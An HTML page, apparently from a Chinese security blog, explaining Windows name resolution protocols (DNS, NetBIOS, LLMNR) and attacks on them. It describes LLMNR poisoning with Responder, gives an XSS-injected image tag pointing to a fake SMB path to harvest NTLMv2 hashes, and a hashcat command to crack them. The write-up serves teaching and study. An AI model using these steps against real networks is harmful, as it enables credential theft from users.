@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Windows名称解析与相应攻击方法 - ConsT27's Blog</title>
+    <link href="../../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Windows\u540d\u79f0\u89e3\u6790\u4e0e\u76f8\u5e94\u653b\u51fb\u65b9\u6cd5", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_1" },
+              {title: "\u540d\u79f0\u89e3\u6790\u7684\u4e3b\u8981\u534f\u8bae", url: "#_2" },
+              {title: "\u9488\u5bf9\u540d\u79f0\u89e3\u6790\u7684\u653b\u51fb\u65b9\u6cd5", url: "#_6" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/" class="btn btn-xs btn-link">
+        windows内网渗透常用命令总汇
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/" class="btn btn-xs btn-link">
+        Windows内网基础概览
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="windows">Windows名称解析与相应攻击方法</h1>
+<h2 id="_1">目录</h2>
+<ul>
+<li><a href="#名称解析的主要协议">名称解析的主要协议</a><ul>
+<li><a href="#DNS">DNS</a><ul>
+<li><a href="#工作机理">工作机理</a></li>
+</ul>
+</li>
+<li><a href="#NETBIOS">NETBIOS</a><ul>
+<li><a href="#工作机理H-节点">工作机理（H-节点）</a></li>
+<li><a href="#节点类型">节点类型</a></li>
+</ul>
+</li>
+<li><a href="#LLMNR">LLMNR</a><ul>
+<li><a href="#工作机理">工作机理</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#针对名称解析的攻击方法">针对名称解析的攻击方法</a><ul>
+<li><a href="#LLMNR-投毒">LLMNR 投毒</a></li>
+<li><a href="#SMB爆破hash">SMB爆破hash</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="_2">名称解析的主要协议</h2>
+<h3 id="dns">DNS</h3>
+<p>dns协议支持IPV4,IPV6,DNS服务器DNS服务的监听端口是UDP/53。</p>
+<h4 id="_3">工作机理</h4>
+<p>1.读取本机的DNS缓存，即HOST文件来进行DNS名称解析
+2.若本地没有对应的名称记录，则请求网络配置的DNS服务器
+3.若DNS服务器也没有对应响应，则DNS质询失败。</p>
+<h3 id="netbios">NETBIOS</h3>
+<p>netbois 监听端口为 UDP/137,它不支持IPV6，它与DNS的不同是它除了通过特定服务器还可以通过广播来进行名称解析。</p>
+<h4 id="h-">工作机理（H-节点）</h4>
+<p>1.检查本地NetBois缓存，有缓存则完成名称解析。（使用nbtstat -c命令查看本机的 NetBIOS 缓存）
+2.若无缓存，且配置了WINS服务器，则通过WINS服务器来进行名称解析（和DNS服务器很像）
+3.若没有WINS服务器或者WINS服务器无响应，则向当前网段发送广播进行质询（和ARP有点像），若有主机响应则完成名称解析
+4.若广播后无任何主机响应，则读取本地Imhosts文件，其存在于C:\Windows\System32\drivers\etc\，（和DNS本地查询很像）</p>
+<h4 id="_4">节点类型</h4>
+<p>NETBIOS的实际工作情况并不是像刚刚说的那么死板，实际上，NETBIOS名称解析有四种不同的工作顺序.</p>
+<p>B-节点(broadcast，广播)</p>
+<p>当 Windows 尝试解析名称时，首先检查 NetBois缓存，如果此行不通，Windows 就会发送广播，如果广播依然失败的话，那Windows 才会检查实际的 LMHOSTS 文件。</p>
+<p>P-节点(per-to-per，对等)</p>
+<p>这种方法并不使用广播，而是在计算机启动时，在网络中的 WINS 服务器上注册它们的名称，当计算机需要解析名称时，它会发送一个解析请求给 WINS 服务器。这种方法只在 WINS 服务器正常运行时有效，如果 WINS 服务器失败，则无法进行名称解析。</p>
+<p>M-节点(mixed，混合)</p>
+<p>Windows 联合使用 B 节点和 P 节点，并且默认使用 B 节点，如果 M 节点不能利用广播进行名称解析，它就使用 P 节点的 WINS 服务器来完成工作。</p>
+<p>H-节点(hybrid，混合)</p>
+<p>同样也是联合使用 B 节点和 P 节点，但工作方式相反，如果使用 WINS 服务器方式不能成功，则使用 B 节点的工作来完成工作。此节点模式也是<strong>目前 Windows 系统默认使用的节点模式</strong>。</p>
+<p>节点模式可以在ipconfig /all 的节点类型处看到。</p>
+<p><img alt="img" src="https://images2015.cnblogs.com/blog/952033/201609/952033-20160915174634992-724611096.png" title="img" /></p>
+<h3 id="llmnr">LLMNR</h3>
+<p>LLMNR不依赖于任何独立服务器 ,它仅靠多播来实现名称解析。它再Windows Vista版本之后出现。
+它又被称作“多播DNS”，监听端口为 UDP/5355</p>
+<h4 id="_5">工作机理</h4>
+<p>1.检查NetBios缓存。
+2.若无缓存，则向当前网域发送广播。
+3.若有主机响应，则解析成功。反之则不成功。</p>
+<h2 id="_6">针对名称解析的攻击方法</h2>
+<h3 id="llmnr_1">LLMNR 投毒</h3>
+<p>下图为LLMNR的正常流程</p>
+<p><img alt="image-20210715155226199" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210715155226199.png" title="image-20210715155226199" /></p>
+<p>被毒化后</p>
+<p><img alt="image-20210715160154939" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210715160154939.png" title="image-20210715160154939" /></p>
+<p>实际上LLMNR投毒并不复杂，无非就是应答LLMNR请求包从而冒充自己为另一台主机。
+在内网环境中诸多名称解析服务都是通过DNS完成的，只有少数如SMB共享和ping还有远程连接（win10会先通过DNS进行解析，DNS解析失败才会使用LLMNR）会使用LLMNR进行名称解析。</p>
+<p>smb请求一个不存在的smb地址，触发LLMNR名称解析(win10)</p>
+<p><img alt="image-20210715183113916" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210715183113916.png" title="image-20210715183113916" /></p>
+<p>远程连接一个不存在的主机，触发LLMNR名称解析（WIN10</p>
+<p><img alt="image-20210715193226761" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210715193226761.png" title="image-20210715193226761" /></p>
+<p>LLMNR投毒的主要攻击方式就是通过在某一机器发起SMB请求时进行冒充，截获目标在SMB通信中发送的hash并进行解密，从而获取用户的密码hash。
+或者冒充WEB服务器进行钓鱼（由于目前LLMNR解析往往只用于SMB和ICMP还有RDP，所以与HTTP沾边的方法很难用到）。</p>
+<h3 id="smbhash">SMB爆破hash</h3>
+<p>我们有必要了解一下，SMB的工作机制。</p>
+<p>实际上SMB在确认对方身份时，用的是NTLM协议。</p>
+<p>所以我们可以通过xss向一个web页面中插入像这样的代码</p>
+<pre><code class="language-纯文本">&lt;img src=\\test\1.jpg&gt;
+</code></pre>
+<p>其中test这一个SMB名称实际上是不存在的，故访问该页面的主机会通过LLMNR去广播解析这个名称对应的IP。我们这个时候将其劫持，回应说自己便是test，接下来就会进入到SMB的身份验证环节：我们向发送SMB请求的机器发送一个challenge，对方便会返回一个其用自己HASH加密的加密字符串response（也就是NTLMv2）过来。我们拿到response后通过爆破工具进行爆破其密钥，便有爆破出其CLIENT HASH的可能性。</p>
+<p>我们用responder进行毒化，在用户访问一个不存在的SMB路径时进行LLMNR应答，发送challenge：1122334455667788并截获其NTLMv2</p>
+<p><img alt="image-20210715191634220" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210715191634220.png" title="image-20210715191634220" /></p>
+<p>随后将NTLMv2-SSP HASH复制到一个文件中，将爆破的密码列表放入另一个文件中。</p>
+<pre><code class="language-纯文本">hashcat -m 5600 hash.txt password.txt
+</code></pre>
+<p><img alt="image-20210715192447073" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210715192447073.png" title="image-20210715192447073" /></p>
+<p>成功爆破出</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E6%80%BB%E6%B1%87/" class="btn btn-xs btn-link">
+        windows内网渗透常用命令总汇
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/Windows%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80%E6%A6%82%E8%A7%88/" class="btn btn-xs btn-link">
+        Windows内网基础概览
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
